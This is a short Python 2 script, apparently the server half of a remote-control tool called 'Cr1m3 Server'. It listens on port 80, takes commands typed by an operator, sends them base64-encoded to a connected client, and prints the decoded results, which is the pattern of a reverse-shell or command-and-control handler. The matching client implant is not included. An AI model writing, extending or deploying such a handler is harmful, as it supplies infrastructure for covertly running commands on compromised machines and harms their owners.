import socket
import sys
import base64

if __name__ == "__main__":
	MAX_BUFF =  347*347*2
	PORT = 80

	server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# this has no effect, why ?
	server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	server_socket.bind(("0.0.0.0", PORT))
	server_socket.listen(10)

	print "Cr1m3 Server started on port (" + str(PORT) + ")"
	print "Listening client..."
	sockfd, addr = server_socket.accept()
	print "Client connected"
	print "\n\n"

#	sys.stderr.write("command> ")
	sys.stdout.write("command>\x20\x20")

	while 1:
		b=sys.stdin.readline()
		b = b.rstrip()
		if len(b) != 0:
			print("command>\x20\x20",b)
		 	sockfd.send(base64.b64encode(b))
			a = sockfd.recv(MAX_BUFF)
			if len(a) >= 2:
				print base64.b64decode(a)
			
			a = ""
			sys.stdout.write("command>")
		
